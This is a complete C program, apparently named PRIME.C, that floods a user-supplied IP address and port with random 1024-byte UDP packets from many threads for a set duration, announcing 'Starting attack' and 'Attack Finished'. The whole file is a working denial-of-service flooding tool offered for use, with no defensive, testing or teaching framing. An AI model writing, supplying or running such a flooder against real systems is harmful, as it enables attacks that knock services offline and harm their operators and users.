#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// Structure for thread arguments
struct prime_args {
    char *ip;
    int port;
    int duration;
};

// Function to generate random string for payload
void generate_payload(char *s, int len) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++) {
        s[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    s[len] = '\0';
}

void *prime_thread(void *arg) {
    struct prime_args *data = (struct prime_args *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    target.sin_addr.s_addr = inet_addr(data->ip);

    char payload[1024];
    generate_payload(payload, 1023);
    
    time_t end = time(NULL) + data->duration;
    while (time(NULL) < end) {
        // High speed sending 
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    pthread_t threads[atoi(argv[4])];
    struct prime_args data = {argv[1], atoi(argv[2]), atoi(argv[3])};

    printf("🚀 PRIME.C: Starting attack on %s:%d...\n", data.ip, data.port);

    for (int i = 0; i < atoi(argv[4]); i++) {
        pthread_create(&threads[i], NULL, prime_thread, &data);
    }

    for (int i = 0; i < atoi(argv[4]); i++) {
        pthread_join(threads[i], NULL);
    }

    printf("✔️ Attack Finished.\n");
    return 0;
}